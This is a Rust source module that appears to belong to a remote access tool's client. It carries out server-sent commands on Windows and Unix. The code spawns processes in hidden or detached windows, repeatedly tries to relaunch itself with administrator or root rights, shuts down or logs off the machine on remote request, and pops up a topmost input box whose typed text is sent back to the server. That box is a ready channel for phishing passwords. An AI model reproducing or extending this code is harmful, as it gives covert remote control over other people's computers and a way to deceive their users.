#[cfg(windows)]
mod windows {
    use std::ptr;
    use std::ptr::null_mut as NULL;
    use std::ffi::{OsStr, CStr};
    use std::os::windows::{process::CommandExt, ffi::OsStrExt};
    use winapi::um::{shellapi::ShellExecuteW, winuser};
    use winapi::um::winuser::SW_HIDE;
    use winapi::shared::minwindef::UINT;
    use winapi::um::wingdi::{CreateSolidBrush, RGB};
    use crate::service::install::is_elevated;
    use common::packets::{MessageBoxData, VisitWebsiteData, InputBoxData, ServerboundPacket};
    use crate::handler::send_packet;
    use std::{
        ffi::CString,
        ptr::null_mut,
        sync::mpsc,
        thread,
    };
    use winapi::{
        shared::{
            minwindef::{DWORD, LPARAM, LRESULT, WORD, WPARAM},
            windef::{HWND, HMENU},
        },
        um::{
            libloaderapi::GetModuleHandleA,
            winuser::*,
        },
    };

    pub fn open_url(url: &str) {
        let _ = std::process::Command
            ::new("cmd")
            .args(["/C", "start", url])
            .creation_flags(winapi::um::wincon::HIDE_WINDOW | winapi::um::wincon::DETACHED_PROCESS)
            .spawn();
    }

    pub fn set_dpi_aware() {
        unsafe {
            winapi::um::winuser::SetProcessDPIAware();
        }
    }

    pub fn visit_website(
        visit_data: &VisitWebsiteData
    ) {
        let visit_type = visit_data.visit_type.as_str();
        let url = visit_data.url.as_str();

        const DETACH: u32 = 0x00000008;
        const HIDE: u32 = 0x08000000;

        if visit_type == "normal" {
            std::process::Command
                ::new("cmd")
                .args(["/C", "start", url])
                .creation_flags(HIDE | DETACH)
                .spawn()
                .unwrap();
        }
    }

    pub fn show_messagebox(data: MessageBoxData) {
        let l_msg: Vec<u16> = format!("{}\0", data.message).encode_utf16().collect();
        let l_title: Vec<u16> = format!("{}\0", data.title).encode_utf16().collect();

        let button = data.button.as_str();
        let icon = data.icon.as_str();

        unsafe {
            winuser::MessageBoxW(
                NULL(),
                l_msg.as_ptr(),
                l_title.as_ptr(),
                (match button {
                    "ok" => winuser::MB_OK,
                    "ok_cancel" => winuser::MB_OKCANCEL,
                    "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                    "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                    "yes_no" => winuser::MB_YESNO,
                    "retry_cancel" => winuser::MB_RETRYCANCEL,
                    _ => winuser::MB_OK,
                }) |
                    (match icon {
                        "info" => winuser::MB_ICONINFORMATION,
                        "warning" => winuser::MB_ICONWARNING,
                        "error" => winuser::MB_ICONERROR,
                        "question" => winuser::MB_ICONQUESTION,
                        "asterisk" => winuser::MB_ICONASTERISK,
                        _ => winuser::MB_ICONINFORMATION,
                    })
            );
        }
    }

    pub fn elevate_client() {
        if is_elevated() {
            return;
        }

        crate::MUTEX_SERVICE.lock().unwrap().unlock();

        let exe = std::env::current_exe().unwrap();
        let path = exe.to_str().unwrap();

        let operation = OsStr::new("runas");
        let path_os = OsStr::new(path);
        let operation_encoded: Vec<u16> = operation.encode_wide().chain(Some(0)).collect();
        let path_encoded: Vec<u16> = path_os.encode_wide().chain(Some(0)).collect();

        unsafe {
            let h_instance = ShellExecuteW(
                ptr::null_mut(),
                operation_encoded.as_ptr(),
                path_encoded.as_ptr(),
                ptr::null(),
                ptr::null(),
                SW_HIDE
            );

            if (h_instance as UINT) > 32 {
                std::process::exit(1);
            } else {
                crate::MUTEX_SERVICE.lock().unwrap().lock();
            }
        }
    }

    const HIDE: u32 = 0x08000000;

    pub fn system_commands(command: &str) {
        match command {
            "shutdown" => run_command("shutdown", &["/s", "/t", "0"]),
            "logout" => run_command("shutdown", &["/l"]),
            "restart" => run_command("shutdown", &["/r", "/t", "0"]),
            _ => {}
        }
    }

    pub fn run_command(command: &str, args: &[&str]) {
        let _ = std::process::Command
            ::new(command)
            .creation_flags(HIDE)
            .args(args)
            .spawn()
            .expect("Failed to run command").wait();
    }

    static mut INPUT_TEXT: [u8; 256] = [0; 256];

    pub fn handle_input_command(data: InputBoxData) {
        let (tx, rx) = mpsc::channel();

        thread::spawn(move || {
            let result = show_input_box(data.title, data.message);
            let _ = tx.send(result);
        });

        tokio::spawn(async move {
            if let Ok(input) = tokio::task::spawn_blocking(move || rx.recv()).await.unwrap() {
                if input.len() > 0 {
                    let _ = send_packet(ServerboundPacket::InputBoxResult(input)).await;
                }

                unsafe {
                    INPUT_TEXT = [0; 256]; // Clear input buffer
                }
            }
        });
    }

    fn show_input_box(title: String, description: String) -> String {
        unsafe {
            let class_name = CString::new("MyInputBox").unwrap();
            let h_instance = GetModuleHandleA(null_mut());

            let wnd_class = WNDCLASSA {
                style: CS_HREDRAW | CS_VREDRAW,
                lpfnWndProc: Some(wnd_proc),
                hInstance: h_instance,
                lpszClassName: class_name.as_ptr(),
                hIcon: LoadIconW(0 as _, IDI_APPLICATION),
                hCursor: LoadCursorW(0 as _, IDC_ARROW),
                hbrBackground: (COLOR_WINDOW + 1) as _,
                lpszMenuName: null_mut(),
                cbClsExtra: 0,
                cbWndExtra: 0,
            };

            RegisterClassA(&wnd_class);

            let desc_cstring = CString::new(description).unwrap();
            let hwnd = CreateWindowExA(
                WS_EX_TOPMOST,
                class_name.as_ptr(),
                CString::new(title).unwrap().as_ptr(),
                WS_DLGFRAME | WS_POPUP | WS_SYSMENU | WS_CAPTION,
                CW_USEDEFAULT,
                CW_USEDEFAULT,
                400,
                245,
                null_mut(),
                null_mut(),
                h_instance,
                desc_cstring.as_ptr() as _,
            );

            ShowWindow(hwnd, SW_SHOW);
            UpdateWindow(hwnd);

            let mut msg = std::mem::zeroed();
            while GetMessageA(&mut msg, null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                DispatchMessageA(&msg);
            }

            std::str::from_utf8(&INPUT_TEXT)
                .unwrap_or("")
                .trim_end_matches('\0')
                .to_string()
        }
    }

    unsafe extern "system" fn wnd_proc(
        hwnd: HWND,
        msg: UINT,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        match msg {
            WM_CREATE => {
                let create_struct = lparam as *const CREATESTRUCTA;
                let desc_ptr = (*create_struct).lpCreateParams as *const i8;
                let label_text = if desc_ptr.is_null() {
                    CStr::from_bytes_with_nul(b"Enter value:\0").unwrap()
                } else {
                    CStr::from_ptr(desc_ptr)
                };

                // Label/description
                CreateWindowExA(
                    0,
                    CString::new("STATIC").unwrap().as_ptr(),
                    label_text.as_ptr(),
                    WS_CHILD | WS_VISIBLE | SS_LEFT,
                    10,
                    10,
                    360,
                    120,
                    hwnd,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                );

                // Input box
                let h_edit = CreateWindowExA(
                    WS_EX_CLIENTEDGE,
                    CString::new("EDIT").unwrap().as_ptr(),
                    null_mut(),
                    WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                    10,
                    140,
                    360,
                    25,
                    hwnd,
                    1 as HMENU,
                    null_mut(),
                    null_mut(),
                );

                SendMessageA(h_edit, EM_LIMITTEXT as u32, 255, 0);

                // Cancel Button
                CreateWindowExA(
                    0,
                    CString::new("BUTTON").unwrap().as_ptr(),
                    CString::new("Cancel").unwrap().as_ptr(),
                    WS_CHILD | WS_VISIBLE,
                    220,
                    170,
                    70,
                    25,
                    hwnd,
                    3 as HMENU,
                    null_mut(),
                    null_mut(),
                );
                
                // OK Button
                CreateWindowExA(
                    0,
                    CString::new("BUTTON").unwrap().as_ptr(),
                    CString::new("OK").unwrap().as_ptr(),
                    WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                    305,
                    170,
                    70,
                    25,
                    hwnd,
                    2 as HMENU,
                    null_mut(),
                    null_mut(),
                );
            }
            WM_COMMAND => {
                let wm_id = LOWORD(wparam as DWORD) as usize;
                match wm_id {
                    2 => {
                        // OK clicked
                        let h_edit = GetDlgItem(hwnd, 1);
                        GetWindowTextA(h_edit, INPUT_TEXT.as_mut_ptr() as *mut i8, 256);
                        DestroyWindow(hwnd);
                    }
                    3 => {
                        // Cancel clicked
                        DestroyWindow(hwnd);
                    }
                    _ => {}
                }
            }
            WM_DESTROY => {
                PostQuitMessage(0);
            }
            _ => {}
        }

        DefWindowProcA(hwnd, msg, wparam, lparam)
    }

    // Helper: extract low word
    fn LOWORD(l: DWORD) -> WORD {
        (l & 0xffff) as WORD
    }
}

#[cfg(unix)]
mod unix {
    use common::packets::{MessageBoxData, VisitWebsiteData, InputBoxData};
    use std::process::Command;
    use std::env;

    pub fn open_url(url: &str) {
        let _ = std::process::Command::new("xdg-open").arg(url).spawn();
    }

    pub fn set_dpi_aware() {
        // No-op on Unix
    }

    pub fn visit_website(visit_data: &VisitWebsiteData) {
        if visit_data.visit_type == "normal" {
            let _ = std::process::Command::new("xdg-open").arg(&visit_data.url).spawn();
        }
    }

    pub fn show_messagebox(_data: MessageBoxData) {
        // No-op on Unix
    }

    pub fn elevate_client() {
        let exe = env::current_exe().unwrap();
        let path = exe.to_str().unwrap();

        let success = try_pkexec(path) || try_gksudo(path) || try_kdesudo(path) || try_sudo(path);

        if success {
            std::process::exit(0);
        }
    }

    fn try_pkexec(path: &str) -> bool {
        Command::new("pkexec")
            .arg(path)
            .spawn()
            .map(|_| true)
            .unwrap_or(false)
    }

    fn try_gksudo(path: &str) -> bool {
        Command::new("gksudo")
            .arg(path)
            .spawn()
            .map(|_| true)
            .unwrap_or(false)
    }

    fn try_kdesudo(path: &str) -> bool {
        Command::new("kdesudo")
            .arg(path)
            .spawn()
            .map(|_| true)
            .unwrap_or(false)
    }

    fn try_sudo(path: &str) -> bool {
        Command::new("sudo")
            .arg(path)
            .spawn()
            .map(|_| true)
            .unwrap_or(false)
    }

    pub fn system_commands(command: &str) {
        match command {
            "shutdown" => run_command("shutdown", &["-h", "now"]),
            "logout" => run_command("pkill", &["-u", &whoami()]),
            "restart" => run_command("shutdown", &["-r", "now"]),
            _ => {}
        }
    }

    pub fn run_command(command: &str, args: &[&str]) {
        let _ = std::process::Command::new(command)
            .args(args)
            .spawn()
            .expect("Failed to run command")
            .wait();
    }

    fn whoami() -> String {
        std::process::Command::new("whoami")
            .output()
            .map(|output| String::from_utf8_lossy(&output.stdout).trim().to_string())
            .unwrap_or_else(|_| "root".to_string())
    }

    pub fn handle_input_command(_data: InputBoxData) {
        // No-op on Unix
    }
}

#[cfg(windows)]
pub use windows::*;

#[cfg(unix)]
pub use unix::*;